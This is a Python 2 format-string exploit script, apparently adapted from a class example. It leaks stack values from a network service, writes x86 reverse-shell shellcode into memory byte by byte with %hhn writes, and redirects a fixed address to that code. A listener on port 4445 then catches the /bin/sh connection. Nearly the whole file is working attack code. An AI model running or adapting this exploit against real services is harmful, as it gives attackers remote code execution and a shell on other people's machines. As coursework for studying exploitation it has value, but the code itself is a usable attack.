#!/usr/bin/python
# This code is adopted from exploit python written by Chris Eagle in class

import os
import socket
import struct
import sys
import telnetlib
import threading

def readLine(s):
    receved = None
    while True:
            ch = s.recv(1)
            if ch:
                if receved is None:
                    receved = ch
                else:
                    receved += ch
                if ch == '\n':
                        break
            else:
                break
    return receved

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def writeByte(s, addr, val, idx):
    format = "%%%dc%%%d$hhn" % (val, idx + 4)
    format += "A"*(16 - len(format))
    sys.stdout.write(format)
    print "           Writing: ord(b)=%d" % val
    s.send(format)

class Listener(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', 4445))
        s.listen(1)
        s.settimeout(10)
        t = telnetlib.Telnet()
        try:
            conn, tgt = s.accept()
        except socket.timeout:
            print "socket timed out. quitting..."
            sys.exit()
        print "incoming connection from: " + str(tgt)
        t.sock = conn
        t.interact()

host = "127.0.0.1"
lhost = host.split(".")

sc ="\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93" + \
"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68" + \
chr(int(lhost[0])) + chr(int(lhost[1])) + chr(int(lhost[2])) + chr(int(lhost[3])) + \
"\x68\x02\x00" + \
"\x11\x5d\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52" + \
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1" + \
"\xb0\x0b\xcd\x80"

s = socket.socket()
s.connect((sys.argv[1], int(sys.argv[2])))

line = readLine(s)
sys.stdout.write(line)


s.send("AAAA %x %x %x %x %x %x %x %x %x %x %x %x\n")
line = readLine(s)

sys.stdout.write(line)

vals = line.split()
buf_start = vals.index('41414141')
print "buffer starts at %d" % buf_start

index = buf_start + 64
while True:
    s.send("%%%d$x %%%d$x\n" % (index, index + 1))
    line = readLine(s)
    vals = line.split()
    v0 = int(vals[0], 16)
    v1 = int(vals[1], 16)
    if v0 == 1 and v1 & 0xbff00000 == 0xbff00000:
        argv = v1
        break
    index += 1

print "argv = %x" % argv

idx = 0
print "Writing: s=%s, argv=%x, idx=%d, buf_start=%d" % (s, argv, idx, buf_start)
for b in sc:
    writeByte(s, argv + idx, ord(b), buf_start)
    #readLine(s)
    idx += 1

exit = 0x08049f30
for i in range(4):
    writeByte(s, exit + i, (argv>> (8 * i)) & 0xff, buf_start)
#readLine(s)

s.send('quit\n')

l = Listener().start()

interact(s)